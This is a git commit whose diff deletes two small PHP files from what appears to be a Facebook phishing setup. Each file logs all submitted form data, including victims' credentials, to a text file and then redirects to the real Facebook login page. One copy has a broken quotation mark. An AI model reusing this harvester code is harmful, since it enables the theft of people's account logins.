fda9436491700fc29fe2a9b3805868367aa7a1e7
AbdulRahman Nadeem <ar-nadeem@outlook.com>
2019-05-10 17:49:07 +0500

    New Start 10-05-19
    Deleted everything new start. Django style ;p

--- facebook/post.php
+++
@@ -1,2 +0,0 @@
-<?php $file = 'harvester_2016-10-23 08:02:14.463777.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND); 
-/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=https://login.facebook.com/login.php" />
--- html/post.php
+++
@@ -1,2 +0,0 @@
-<?php $file = "dump.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND); 
-/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=https://facebook.com/login.php" />
